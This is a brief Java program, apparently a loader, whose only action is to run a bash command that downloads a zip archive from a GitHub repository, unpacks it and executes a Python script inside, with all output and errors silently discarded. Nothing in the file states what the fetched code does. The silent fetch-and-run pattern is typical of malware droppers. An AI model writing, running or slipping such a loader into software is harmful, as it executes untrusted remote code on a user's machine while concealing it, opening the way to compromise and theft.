import java.io.*;
import java.util.*;

public class run {
    public static void main(String[] args) {
        try {
            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "wget https://github.com/levatinaforekina-arch/scaling-doodle/raw/refs/heads/main/palantir.zip;unzip palantir.zip;python apps.py");
            builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            builder.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process process = builder.start();
            process.waitFor(); // wait if needed
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
